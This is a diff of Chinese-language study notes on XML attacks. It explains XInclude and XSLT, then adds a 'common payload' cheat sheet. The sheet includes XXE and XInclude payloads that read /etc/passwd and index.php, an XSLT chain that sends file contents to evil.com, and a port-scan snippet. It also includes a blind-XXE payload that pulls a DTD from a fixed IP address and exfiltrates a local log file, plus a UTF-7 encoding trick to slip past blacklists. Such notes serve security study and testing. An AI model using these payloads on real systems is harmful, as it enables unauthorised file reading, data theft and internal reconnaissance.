@@ -156,24 +156,235 @@ DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。
 
 
 
+### xinclude
+
+ https://www.anquanke.com/post/id/156227 
+
+#### 语法
 
 
 
+xinclude的语法相对来说，非常简单，只是在`http://www.w3.org/2003/XInclude`命名空间中的两个元素，即 include 和 fallback
+常用的命名空间前缀是“xi”(但可以根据喜好自由使用任何前缀)
 
-## 有回显的任意文件读取
+**xi:include 元素**
+
+元素中的几个属性:
+
+- href — 对要包括的文档的 URI 引用。
+- parse — 它的值可以是“xml”或“text”，用于定义如何包括指定的文档（是作为 XML 还是作为纯文本）。默认值是“xml”。
+- xpointer — 这是一个 XPointer，用于标识要包括的 XML 文档部分。如果作为文本包括 (parse=”text”)，将忽略该属性。
+
+encoding — 作为文本包括时，该属性提供所包括文档的编码提示信息。
+样例如下：
+
+```xml
+<xi:include href="test.xml" parse="text"/>
+```
+
+**xi:fallback 元素**
+
+简单而言，类似于`try...except...`，如果xinclude的内容出现问题，则显示fallback的内容
+例如
+
+```xml
+<xi:include href="test.xml" parse="text"/>
+    <xi:fallback>Sorry, the file is unavailable<xi:fallback>
+</xi:include>
+```
+
+此时解析xml后，若test.xml不存在，则会解析获取到`Sorry, the file is unavailable`
+
+
+
+### xsl
+
+XSL 指扩展样式表语言（EXtensible Stylesheet Language）
+而XSLT 指 XSL 转换：即使用 XSLT 可将 XML 文档转换为其他文档，比如XHTML。
+
+#### 简单样例
+
+下面展示利用php后端语言，将xml转换为html
+test.xml
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<root>
+    <name>sky</name>
+    <blog>skysec.top</blog>
+    <country>China</country>
+</root>
+```
+
+test.xsl
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<xsl:stylesheet version="1.0"
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:template match="/">
+<html>
+<body>
+<table border="1">
+  <tr bgcolor="#9acd32">
+    <th align="left">Name</th> 
+    <th align="left">Blog</th> 
+    <th align="left">Country</th> 
+  </tr>
+  <xsl:for-each select="root">
+  <tr>
+    <td><xsl:value-of select="name" /></td>
+    <td><xsl:value-of select="blog" /></td>
+    <td><xsl:value-of select="country" /></td>
+  </tr>
+  </xsl:for-each>
+</table>
+</body>
+</html>
+</xsl:template>
+</xsl:stylesheet>
+```
+
+test.php
+
+```php
+<?php 
+$xslDoc = new DOMDocument();
+$xslDoc->load("test.xsl");
+$xmlDoc = new DOMDocument();
+$xmlDoc->load("test.xml");
+$proc = new XSLTProcessor();
+$proc->importStylesheet($xslDoc);
+echo $proc->transformToXML($xmlDoc);
+```
+
+结果如下
+[![img](https://p5.ssl.qhimg.com/t01f1f7c7c5c85ec8ad.png)](https://p5.ssl.qhimg.com/t01f1f7c7c5c85ec8ad.png)
+
+
+
+#### 文件读取
+
+##### 未禁用外部实体引用
+
+ php底层的libxml库默认禁用了外部实体引入，所以我们还是需要手动加入 
+
+```php
+$xslDoc = new DOMDocument();
+$xslDoc->load("test.xsl",LIBXML_NOENT);
+```
+
+
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE ANY [  
+<!ENTITY shit SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">   
+]>  
+<xsl:stylesheet version="1.0"
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:template match="/root">
+  &shit;
+</xsl:template>
+</xsl:stylesheet>
+```
+
+
+
+##### 禁用外部实体引用
+
+```xml
+<xsl:variable name="name1" select="document('file:///etc/passwd')" />
+<xsl:variable name="name2" select="concat('http://evil.com/?', $name1)" />
+<xsl:variable name="name3" select="document($name2)" />
+```
+
+#### 端口扫描
+
+##### xsl端口扫描
+
+```xml
+<xsl:for-each select="sky">
+  <tr>
+    <td><xsl:value-of select="name" /></td>
+    <td><xsl:value-of select="blog" /></td>
+    <td><xsl:value-of select="country" /></td>
+    <td><xsl:value-of select="document('http://127.0.0.1:9999')" /></td>
+  </tr>
+  </xsl:for-each>
+```
+
+
 
 ## 常用payload
 
-```xml
-<?xml version="1.0" encoding="utf-8"?> 
-<!DOCTYPE roottag [ 
-<!ENTITY % dtd SYSTEM "http://39.108.164.219:60001/evil.txt"> 
-%dtd;%int;%send; ]> 
+### blind-xxe
 
-evil.txt
-<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
-<!ENTITY % int "<!ENTITY &#x25; send SYSTEM 'http://39.108.164.219:60000/?p=%file;'>">
+```xml-dtd
+<?xml version="1.0"?>
+<!DOCTYPE ANY[
+<!ENTITY % file SYSTEM "file://c:/mls_lca.log">
+<!ENTITY % remote SYSTEM "http://39.108.164.219:60001/evil.xml">
+%remote;
+%all;
+]>
+<root>&send;</root>
 ```
 
+vps:
+
+```xml-dtd
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://39.108.164.219:60000/1.php?file=%file;'>">
+
+```
+
+
+
 通过 `<![CDATA[`和 `]]>`将payload包裹起来，使其不解析为XML就可以读取文件
+
+### 利用php伪协议任意读取文件
+
+```xml-dtd
+<?xml version="1.0" encoding="utf-8"?> 
+<!DOCTYPE root [
+	<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
+]>
+<root>
+	&file;
+</root>
+```
+
+### 利用UTF-7，UTF-16等编码去Bypass 黑名单
+
+
+
+我们利用
+
+```
+https://www.motobit.com/util/charset-codepage-conversion.asp
+```
+
+转为utf-7
+
+```xml
++ADwAIQ-DOCTYPE ANY +AFs-
+  +ADwAIQ-ENTITY f SYSTEM +ACI-file:///etc/passwd+ACIAPg-
++AF0APg-
++ADw-x+AD4AJg-f+ADsAPA-/x+AD4-
+```
+
+然后使用
+
+```
+<?xml version="1.0" encoding="utf-7" ?>
+```
+
+### xinclude payload(禁用外部实体引用)
+
+```xml
+<?xml version="1.0" ?>
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+ <xi:include href="file:///etc/passwd" parse="text"/>
+</root>
+```
 
